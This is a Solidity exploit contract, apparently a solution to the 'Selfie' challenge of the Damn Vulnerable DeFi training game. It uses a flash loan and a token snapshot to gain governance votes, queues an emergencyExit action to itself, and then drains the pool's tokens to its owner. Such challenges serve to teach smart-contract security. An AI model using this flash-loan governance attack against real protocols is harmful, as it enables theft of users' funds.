// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../selfie/SelfiePool.sol";
import "../selfie/SimpleGovernance.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";

contract SelfieAttacker {
    SelfiePool pool;
    IERC3156FlashBorrower borrower;
    SimpleGovernance governance;
    DamnValuableTokenSnapshot DVT;
    address owner;
    uint256 public actionId;
    bytes result;

    constructor(address _pool, address _governance, address _DVT) {
        pool = SelfiePool(_pool);
        borrower = IERC3156FlashBorrower(address(this));
        governance = SimpleGovernance(_governance);
        DVT = DamnValuableTokenSnapshot(_DVT);
        owner = msg.sender;
    }

    function attack() external {
        pool.flashLoan(
            borrower,
            address(DVT),
            DVT.balanceOf(address(pool)),
            ""
        );
    }

    function onFlashLoan(
        address,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        require(token == address(DVT), "Token not supported");
        DVT.snapshot();

        actionId = governance.queueAction(
            address(pool),
            0,
            abi.encodeWithSignature("emergencyExit(address)", address(this))
        );
        DVT.approve(address(pool), amount + fee);
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function withdraw() external {
        require(msg.sender == owner, "Not owner");
        result = governance.executeAction(actionId);
        pool.token().transfer(
            msg.sender,
            pool.token().balanceOf(address(this))
        );
    }
}
